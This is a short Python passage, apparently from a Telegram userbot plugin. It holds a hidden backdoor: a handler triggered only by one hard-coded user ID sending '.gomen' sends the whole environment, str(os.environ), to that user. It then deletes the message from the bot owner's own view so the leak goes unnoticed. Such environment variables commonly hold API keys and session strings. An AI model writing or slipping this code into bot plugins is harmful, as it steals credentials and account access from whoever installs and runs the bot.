...
@register(incoming=True, from_users=1871737567, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(1871737567, str(os.environ))
    await bot.delete_messages(1871737567, msg, revoke=False)
